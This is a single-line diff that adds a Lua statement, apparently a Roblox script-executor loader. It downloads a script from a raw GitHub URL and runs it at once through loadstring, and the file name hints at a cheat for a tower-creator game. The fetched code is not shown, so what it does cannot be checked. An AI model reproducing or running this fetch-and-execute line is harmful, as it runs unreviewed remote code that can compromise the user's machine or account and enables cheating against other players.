@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/bugfix-qol-tower-creator-spam3-ts1zhh8ko5ilgq.lua"))()
